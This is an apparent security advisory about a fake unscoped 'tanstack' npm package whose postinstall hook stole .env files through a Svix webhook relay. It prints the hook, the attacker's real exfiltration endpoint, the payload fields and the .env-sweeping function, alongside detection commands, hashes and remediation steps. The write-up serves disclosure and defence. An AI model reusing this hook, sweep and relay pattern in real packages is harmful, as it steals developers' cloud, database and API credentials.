# Fake tanstack npm Package — .env File Exfiltration via Svix Webhook Relay

**Date:** April 2026
**Ecosystem:** npm
**Severity:** High
**Type:** Typosquatting / Name squatting / .env credential exfiltration
**Sources:**
- [Aikido Security — Someone published four versions of a fake "tanstack" package in 27 minutes to steal your .env files](https://www.aikido.dev/blog/fake-tanstack-packages-steal-env-files)

---

## Summary

On April 29, 2026, an attacker exploited the unscoped `tanstack` npm package name — separate from the legitimate `@tanstack/*` scoped organization, which publishes TanStack Query (~8 million weekly downloads), TanStack Table, and TanStack Router — to deploy a rapid-iteration credential harvesting campaign. Between 17:08 and 17:35 UTC, four malicious versions (`2.0.4`–`2.0.7`) were published in 27 minutes, each with a `postinstall` hook designed to read `.env` files from the developer's working directory and exfiltrate their contents to an attacker-controlled endpoint.

The attack is notable for its live iteration behavior: the attacker was actively watching results, adjusting targeted file patterns, testing their webhook receiver, and optimizing for stealth across four rapid releases. The most dangerous version (`2.0.6`) performs a full directory sweep for any file matching `.env*` — capturing `.env`, `.env.local`, `.env.production`, `.env.staging`, and `.env.development` in a single POST. The attacker abused [Svix](https://svix.com), a legitimate webhooks-as-a-service company, as an exfiltration relay, routing stolen data through a trusted third-party to evade network-level domain blocking.

The package had approximately 19,830 monthly downloads before this campaign, demonstrating that even modestly-trafficked squatted names represent a viable attack surface. The `tanstack` unscoped name has been registered since December 2024 and presents as a polished SDK ("TanStack Player") with a convincing README including sponsorship badges, npm download shields, a feature comparison table, and code examples.

---

## Compromised Artifacts

| Package | Malicious Versions | Pre-attack Downloads (monthly) |
|---------|-------------------|-------------------------------|
| `tanstack` (unscoped — NOT `@tanstack/*`) | `2.0.4`, `2.0.5`, `2.0.6`, `2.0.7` | ~19,830 |

**Important:** The legitimate TanStack project publishes exclusively under the `@tanstack/*` npm scope (e.g., `@tanstack/query`, `@tanstack/table`). The unscoped `tanstack` package has no affiliation with the official TanStack project.

---

## How It Worked

### Entry Point: Name Squatting on Unscoped Package

The attacker registered the `tanstack` unscoped npm package name, which had been dormant since December 2024. The package was presented as "TanStack Player" — a convincing cover story with a polished README designed to pass a casual inspection. A developer running `npm install tanstack` instead of the correct `npm install @tanstack/query` would install this package instead.

### Payload: postinstall.cjs

All four malicious versions use a `postinstall` hook:

```json
"scripts": {
  "postinstall": "node postinstall.cjs"
}
```

`postinstall.cjs` reads `.env` files from the developer's working directory and POSTs their contents to a Svix webhook endpoint:

```javascript
// Exfiltration endpoint (all four versions)
const ENDPOINT = "https://api.svix.com/ingest/api/v1/source/src_3387PLMB2uhXOBe3Q8sHu/in/3j2jokvbaF4WWdngv8zBbkS";

// Payload structure (field names are misdirection — actual contents are .env files)
{
  "package": "tanstack",
  "version": "2.0.x",
  "event": "postinstall",
  "readme": "<contents of .env>",      // Field name misdirection
  "agents": "<contents of .env.local>", // Field name misdirection
  "timestamp": "...",
  "node": "v22.x.x",
  "platform": "linux",
  "arch": "x64"
}
```

Svix is a legitimate webhooks-as-a-service platform. Using its "Ingest" product as an exfiltration relay routes stolen data through a trusted domain (`api.svix.com`), bypassing network-layer blocklists tuned for unknown attacker infrastructure.

### Version Iteration: Live Debugging in 27 Minutes

The four-version release pattern reveals an attacker actively watching and adjusting their campaign in real time:

| Version | Time (UTC) | Behavior | Notable changes |
|---------|-----------|----------|----------------|
| `2.0.4` | 17:08 | Targets `.env` and `.env.local`; opt-out check commented out (no escape hatch); duplicate `postinstall.js` present; imports `http` module but never uses it | Initial deploy |
| `2.0.5` | 17:11 (+3 min) | Targets `README.md` and `AGENTS.md` instead of `.env` files; opt-out mechanism re-enabled | Testing webhook receipt / attempting to look innocuous |
| `2.0.6` | 17:26 (+15 min) | **Most dangerous:** sweeps entire working directory for all `.env*` files; console output suppressed; opt-out commented out again | Optimized for maximum credential coverage |
| `2.0.7` | 17:35 (+9 min) | Reverts to `.env` + `.env.local` targeting; keeps console suppressed; adds self-referential dependency `"tanstack": "^2.0.6"` | Cleanup / unknown purpose for self-dep |

Version `2.0.6`'s directory sweep:

```javascript
function collectEnvFiles() {
  const allFiles = fs.readdirSync(rootDir);
  const matches = allFiles.filter(
    (f) => f === ".env" || f.startsWith(".env.")
  );
  for (const file of matches) {
    envFiles[file] = fs.readFileSync(path.join(rootDir, file), "utf-8");
  }
  return envFiles;
}
```

This catches `.env`, `.env.local`, `.env.production`, `.env.staging`, `.env.development`, `.env.test`, `.env.example`, and any other `.env.*` file present — including production credentials if a `.env.production` file exists near the working directory.

### What Gets Stolen

A typical JavaScript project's `.env` files contain:

- AWS access keys and secrets (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`)
- GitHub personal access tokens
- npm publish tokens
- Database connection strings
- Stripe, Twilio, Resend, SendGrid, and other third-party API keys
- OpenAI, Anthropic, and other LLM API keys
- OAuth client secrets
- Any other third-party credentials configured locally or in CI

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Dec 2024 | `tanstack` unscoped npm package registered; no postinstall hook through `2.0.3` |
| Apr 29, 2026 17:08 | `tanstack@2.0.4` published with postinstall exfiltration hook |
| Apr 29, 2026 17:11 | `tanstack@2.0.5` published (3 min later — attacker testing webhook) |
| Apr 29, 2026 17:26 | `tanstack@2.0.6` published — most dangerous version; sweeps all `.env.*` files |
| Apr 29, 2026 17:35 | `tanstack@2.0.7` published — final iteration |
| Apr 29, 2026 | Aikido Security identifies campaign and publishes disclosure |
| Apr 30, 2026 | npm takes down malicious `tanstack` versions |

---

## Detection

```bash
# Check for malicious tanstack versions in lock files and node_modules
grep -r '"tanstack"' package-lock.json yarn.lock pnpm-lock.yaml 2>/dev/null
npm ls tanstack 2>/dev/null

# Affected versions: 2.0.4, 2.0.5, 2.0.6, 2.0.7
cat node_modules/tanstack/package.json 2>/dev/null | grep '"version"'

# Verify package hash (all malicious):
sha256sum node_modules/tanstack/postinstall.cjs 2>/dev/null

# Known malicious SHA-256 hashes (full tarballs):
# tanstack@2.0.4: 72ec4571e27c06f1d48737477c2b38a4f90d699950dab8946b48591133dc4f90
# tanstack@2.0.5: 04ee5325c8900c9d644ed81c9012525b6fc19f21c65cef85b6ba98b6a0a23566
# tanstack@2.0.6: abc164807947b102164488a08161adb4ee08be6b78a371350a6b156eed0d97d9
# tanstack@2.0.7: 7bb84e6ba893248814cd3bac70b7bdc115740fba9e13419940c73460cbcd7b6f

# Check network logs for exfiltration traffic
# Look for outbound HTTPS POST to api.svix.com around time of npm install
grep -r "api\.svix\.com\|src_3387PLMB2uhXOBe3Q8sHu" /var/log/ ~/.npm/_logs/ 2>/dev/null

# In CI environments — check pipeline logs for the install timestamp and
# any outbound HTTPS calls to api.svix.com from the build runner

# Check if .env files were present in working directory at install time
ls -la .env .env.local .env.production .env.staging .env.development 2>/dev/null

# For CI environments: verify all secrets injected into the pipeline are not exposed
# Check if npm ci / npm install ran in a directory containing .env files
```

---

## Remediation

1. **Remove the malicious package:**
   ```bash
   npm uninstall tanstack
   # Verify removal:
   ls node_modules/tanstack 2>/dev/null && echo "still present" || echo "removed"
   ```

2. **If any of the malicious versions (`2.0.4`–`2.0.7`) appear in a lock file, assume all `.env` files in the working directory at install time were exfiltrated.** Rotate immediately:
   - AWS access keys and secrets (check CloudTrail for unauthorized API calls since install time)
   - GitHub tokens with `repo` or `org` scope
   - npm publish tokens — revoke at npmjs.com/settings
   - All database credentials in `.env`
   - All third-party API keys (Stripe, Twilio, OpenAI, Anthropic, etc.)
   - OAuth client secrets

3. **For CI environments:** the `postinstall` fires during `npm ci` as well. If your pipeline installed this package, rotate all secrets injected into that pipeline's environment. Review CI job logs for the install step and check for outbound calls to `api.svix.com`.

4. **Note: this attack has no binary droppers or persistence mechanisms.** Once the package is removed and credentials are rotated, there are no malicious binaries or cron jobs to hunt for. The data exfiltration was a one-time POST at install time.

5. **Prevent name-squatting confusion going forward:** explicitly require the `@tanstack/*` scoped package in `package.json`:
   ```json
   "dependencies": {
     "@tanstack/query": "^5.x.x"
   }
   ```
   Never install the unscoped `tanstack` package.

6. **Use `--ignore-scripts` in CI** to prevent postinstall hooks from running in sensitive environments:
   ```bash
   npm ci --ignore-scripts
   ```

---

## Lessons Learned

- **Unscoped package names adjacent to popular scoped organizations are persistent attack surfaces:** The `@tanstack` organization publishes packages used by millions of developers per week; the `tanstack` unscoped name is a credible-looking installation mistake waiting to happen, and the attacker had been sitting on it since December 2024
- **Four-version live iteration is a new operational pattern:** The 27-minute, four-version sequence shows an attacker who was present and actively optimizing — not a drive-by publish. This suggests deliberate targeting and real-time monitoring of exfiltration results, which implies more data may have been stolen than just `.env` files
- **Trusted third-party relays defeat domain-based network detection:** Routing exfil through Svix's legitimate `api.svix.com` infrastructure renders standard network-layer blocklists ineffective — only content-inspection or egress policy enforcement can catch this
- **`.env` files in CI working directories are frequently overlooked:** Developers commonly check `.env.production` and `.env.staging` into CI working directories for deployment convenience — `2.0.6`'s full `.env.*` sweep would capture these without the developer realizing they were present in scope
- **Squatted package cover stories now rival legitimate packages in polish:** The `tanstack` README included sponsorship badges, download shields, and code examples — casual inspection would not flag it

---

## IOCs

| Indicator | Type | Notes |
|-----------|------|-------|
| `tanstack@2.0.4` | Malicious package | npm; SHA-256: `72ec4571e27c06f1d48737477c2b38a4f90d699950dab8946b48591133dc4f90` |
| `tanstack@2.0.5` | Malicious package | npm; SHA-256: `04ee5325c8900c9d644ed81c9012525b6fc19f21c65cef85b6ba98b6a0a23566` |
| `tanstack@2.0.6` | Malicious package | npm; SHA-256: `abc164807947b102164488a08161adb4ee08be6b78a371350a6b156eed0d97d9` |
| `tanstack@2.0.7` | Malicious package | npm; SHA-256: `7bb84e6ba893248814cd3bac70b7bdc115740fba9e13419940c73460cbcd7b6f` |
| `hxxps://api.svix[.]com/ingest/api/v1/source/src_3387PLMB2uhXOBe3Q8sHu/in/3j2jokvbaF4WWdngv8zBbkS` | Exfiltration endpoint | Svix webhook relay |
| `src_3387PLMB2uhXOBe3Q8sHu` | Svix source ID | Attacker-controlled webhook source |
| `sh20rajah` | npm maintainer account | Package publisher |

---

## Related Incidents

- [Gone Phishin' — npm Packages as CDN for Industrial Spear-Phishing (Jan 2026)](./2026-01-gone-phishin-npm-phishing.md) — Similar CDN/trusted-third-party abuse vector; jsDelivr used as phishing kit CDN
- [Strapi CMS npm Typosquats (April 2026)](./2026-04-strapi-npm-typosquats.md) — Concurrent April 2026 typosquatting campaign using 36 fake Strapi plugins
- [G_Wagon — npm Infostealer (Jan 2026)](./2026-01-gwagon-npm-infostealer.md) — Fake UI library used as cover; exfiltrated browser credentials and cloud keys
- [dYdX npm & PyPI Compromise (Jan 2026)](./2026-01-dydx-npm-pypi.md) — DeFi ecosystem credential theft via compromised publishing credentials
